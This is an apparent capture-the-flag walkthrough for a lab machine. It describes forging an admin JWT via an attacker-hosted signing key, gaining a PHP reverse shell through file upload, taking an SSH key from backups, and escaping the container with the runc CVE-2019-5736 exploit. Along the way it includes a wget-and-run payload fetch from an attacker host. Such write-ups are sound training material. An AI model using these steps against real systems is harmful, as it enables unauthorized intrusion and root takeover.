# Foothold

1. Run nmap to see three ports are open: 22,80,10100.
2. 10100 is run rx-api, not currently useful.
3. We can visit the webpage and it consists of a notetaking app. 
4. We can create an user from the register page. Enumerating the webpage, we can see that there is an /admin directory which is not accessible to a non-admin user.
5. We can see for authentication we are using JWT toke. Inspect the JWT token and we can see that the JWT token is a RS256 alg, and kid hosted on a local host. We can bypass this by generating our own RSA public private key and signing them with it. Host the private key on your local machine and change the address for the private key to your local machine in the JWT token. Also don't forget to change the admin_cap to true.
6. Generate the JWT token from jwt.io, change your document.cookie to the new cookie and visit /admin
7. We can see there is a new panel called as admin panel. We can view notes from all users or see that there is a provision to upload a file. Viewing the notes we can see two main vulns, php code execution from file upload (PHP rev shell can be uploaded and executed) and also backups are now active, which means we can find something in /var/backups.
8. Get rev shell from file upload vulnerability and get shell from listener.

## Priv Esc

9. After we get the shell, we can just go to /var/backups and see the whole backup - home.tar.gz. Enumerate and see the name of the user is noah. We can move it to /tmp and extract using tar xvf and cat /home/.ssh/id_rsa. This is the RSA priv key for noah.
10. ssh noah@10.10.10.230 -i id_rsa. 
11. We can see that noah can run sudo docker exec -it webapp-dev01 <cmd> without password.
12. Looking for similar vulnerabilites, we can come across three runc vulns, the two from exploit DB can break the docker image. Container breakout(2) requires runc library on the docker image and thus wouldn't work as runc isn't installed in the docker image and Container breakout(1) gave a shell which wasn't responsive.
13. https://github.com/Frichetten/CVE-2019-5736-PoC is the proper exploit.
14. We need to change the payload in the main.go as per our wish, either cat out /root/root.txt > /tmp/root.txt and read the flag or use nc to connect. go build main.go(to compile the new binary). Now host this file for the docker file to retrieve. (python3 -m http.server)
15. Open two ssh sessions
16. First SSH session:
	a. sudo docker exec -it webapp-dev01 /bin/bash
	b. wget http:<IP>:<PORT>/main
	c. chmod +x main.
	d. ./main
17. Second SSH session:
	a. Before executing ./main, make sure to keep the command sudo docker exec -it webapp-dev01 /bin/sh ready.
	b. As soon as the "Overwritten /bin/sh" comes on the first session. Run the command in the second session.
	c. The flag would be copied to /tmp/root.txt. Cat it out
